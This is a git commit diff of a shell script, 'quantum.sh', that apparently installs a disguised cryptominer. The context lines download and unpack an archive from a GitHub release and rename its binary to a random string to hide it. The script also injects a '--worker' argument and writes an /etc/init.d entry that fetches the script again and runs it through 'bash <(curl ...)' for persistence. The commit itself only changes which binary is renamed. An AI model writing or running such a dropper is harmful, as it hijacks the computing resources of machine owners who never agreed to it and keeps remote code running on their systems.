70a7d30473f1e5a5913483fd68bbe090f8dd0f3f
tonenata <jerryaldon387@gmail.com>
2024-06-05 19:57:38 +0000

    Update quantum.sh

--- quantum.sh
+++ quantum.sh
@@ -3,7 +3,7 @@ wget https://github.com/entropycx/gravity/releases/download/v1.5.0/kinetic.tar
 tar -xvf kinetic.tar
 cd /kinetic
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
-mv sakato $variable1
+mv spectrum $variable1
 sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./relativity.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/entropycx/gravity/main/quantum.sh)" > momentum.sh
